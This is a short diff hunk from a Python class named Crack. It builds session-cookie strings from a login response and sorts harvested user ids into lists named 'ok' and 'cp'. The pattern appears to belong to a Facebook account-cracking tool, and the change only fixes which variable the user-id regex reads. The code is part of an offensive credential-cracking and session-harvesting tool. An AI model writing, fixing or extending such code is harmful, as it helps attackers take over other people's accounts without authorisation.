@@ -520,7 +520,7 @@ class Crack:
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
 					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 					cookie = f"sb={sb};{coki}"
-					user = re.findall("c_user=(\d+)",coki)[0]
+					user = re.findall("c_user=(\d+)",cookie)[0]
 					if user in self.ok or user in self.cp:
 						break
 					else:
